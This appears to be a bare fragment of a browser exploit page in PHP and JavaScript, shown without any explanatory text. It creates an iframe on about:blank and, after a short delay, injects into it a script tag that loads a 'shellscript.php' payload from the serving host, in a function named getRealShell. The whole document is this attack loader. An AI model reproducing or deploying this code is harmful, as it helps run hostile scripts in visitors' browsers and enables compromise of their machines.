function getRealShell() {
    myiframe.document.write("<SCRIPT SRC='<?php

echo "http://".$_SERVER["HTTP_HOST"].substr($_SERVER["REQUEST_URI"],0,strrpos($_SERVER["REQUEST_URI"],"/"))."/shellscript.php";    
    
?>'><\/SCRIPT>");
}

document.write("<IFRAME ID=myiframe SRC='about:blank' WIDTH=200 HEIGHT=200></IFRAME>");
setTimeout("getRealShell()",100);
